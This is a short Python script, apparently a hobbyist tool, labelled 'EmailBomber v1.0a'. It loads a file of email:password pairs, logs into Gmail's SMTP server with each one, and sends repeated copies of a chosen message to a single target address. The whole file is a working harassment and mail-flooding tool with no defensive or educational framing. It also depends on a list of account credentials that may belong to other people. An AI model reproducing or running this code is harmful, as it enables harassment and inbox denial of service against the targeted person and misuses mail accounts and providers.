import smtplib
from colorama import Fore,init

init()

def email(user, passw, server, port):
    try:
        global s
        s = smtplib.SMTP(server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(user, passw)
    except Exception as e:
        print(Fore.RED + 'Error:{0}'.format(e))
def send(body, target, user):
    try:
        s.sendmail(user, target, body)
    except Exception as e:
        print(Fore.RED + 'Error:{0}'.format(e))
def attack(body, target, user):
    try:
        send(body, target, user)
        s.close()
    except Exception as e:
        print(Fore.RED + 'Error:{0}'.format(e))
def acc_setup(filewacc):
    global list_account
    with open(filewacc, "r") as f:
        lines = f.readlines()
    list_account = []
    for acc in range(len(lines)):
        list_account.append(lines[acc])

print(Fore.RED+'''EmailBomber v1.0a
        by lucid''')
amount = int(input("How many emails>> "))
txtfile = str(input("Account file>> "))
target = str(input("Target>> "))
msg = str(input("Msg>> "))
acc_setup(txtfile)
for i in range(amount):
    user = list_account[i].split(":")
    email(user[0], user[1], 'smtp.gmail.com', int(587))
    for i in range(5):
        attack(body=msg, target=target, user=user[0])